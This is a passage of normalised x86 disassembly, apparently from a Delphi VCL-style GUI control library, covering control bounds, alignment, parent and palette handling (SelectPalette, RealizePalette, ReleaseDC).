mov eax ebx
call sub_44a488
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404480
je r-xdata
mov al 0x1
pop ebx
retn
sub_43cd28
push ebx
mov ebx eax
mov eax ebx
call sub_44a4c4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43cd5c
push ebx
mov ebx eax
mov eax ebx
call sub_41a9d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43cd84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43de28
sub_43cda4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_43cdc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_4040c8
sub_43cde8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43dd18
sub_43ce08
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_43ce34
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404480
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_43ce98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43d774
sub_43ceb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43d760
sub_43ced8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_43cef8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a0e4
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d22c
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43dea8
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43ca18
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_43ed84
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_43cfd0
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_40362c
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45cdc8
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403614
push edi
xor ecx ecx
mov edx 0xb039
call sub_43efc4
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_43d798
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_40349c
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_4032a0
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_4032a0
mov eax [ edi + 0x68 ]
call sub_4032a0
mov eax [ edi + 0x64 ]
call sub_40892c
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41a130
test bl bl
jle r-xdata
sub_43d09c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_43d0c4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_40349c
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43d14c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_43d44c
sub_43d16c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_4032a0
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_43fde0
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40349c
mov edx ebx
mov eax edi
call sub_41a1b4
mov eax ebx
mov si 0xffd9
call sub_40349c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_43d234
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a544
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43efc4
sub_43d2c8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a400
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_43ddb0
jmp r-xdata
xor edx edx
mov eax esi
call sub_43d16c
sub_43d30c
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_40349c
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_43d14c
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_40349c
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_43d3b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_43f554
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43e240
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43d44c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_43efc4
mov eax ebx
mov si 0xffd0
call sub_40349c
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_40349c
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_43d44c
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_4448fc
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_43d568
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_43d58c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_43d5b4
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_43d5d8
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_43d5fc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43d6f7
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_40349c
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d6fe
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413f80
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_40349c
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_40349c
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413c88
sub_43d708
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43e240
mov edx edi
mov eax ebx
call sub_43d7b8
mov edx edi
mov eax ebx
call sub_43f068
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43d774
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_4040c8
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_43d7b8
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43d814
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43d840
mov edx eax
mov ecx esp
mov eax esi
call sub_412988
mov edx esp
mov eax ebx
call sub_43dc84
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43d858
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43d7fc
mov ecx esp
mov edx esi
call sub_412988
mov edx esp
mov eax ebx
call sub_43dc84
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43d880
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43d901
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d908
lea eax [ ebp - 0xc ]
call sub_404074
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
sub_43d910
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43d93c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43d968
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_45931c
sub_43d998
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_43efc4
sub_43da14
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call sub_4061f4
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call sub_4061f4
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call sub_4061f4
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call sub_4061f4
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call sub_4061f4
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call sub_4061f4
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call sub_4061f4
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call sub_4061f4
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41d684
push eax
call sub_4061f4
mov edx eax
mov eax ebx
call sub_41d6a0
sub_43dbe0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43dc76
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41a63c
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43ddf8
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404480
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dc7d
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43de28
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_43dc84
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_43dccc
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
test esi esi
je r-xdata
mov edx ebx
call sub_441270
mov edx ebx
mov eax esi
call sub_44119c
mov eax ebx
call sub_43d44c
sub_43dd18
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_40349c
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_43efc4
mov eax edi
mov si 0xffd0
call sub_40349c
sub_43ddb0
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4520d4
mov edx ebx
mov eax esi
call sub_41a1b4
sub_43ddd4
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_43efc4
pop ebx
retn
sub_43ddf8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43dd6c
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404164
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_43dd7c
sub_43de28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43de7d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43ddf8
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404480
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43de84
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax esi
call sub_404534
mov edx eax
mov eax ebx
call sub_43ddd4
sub_43dea8
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41d5e0
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
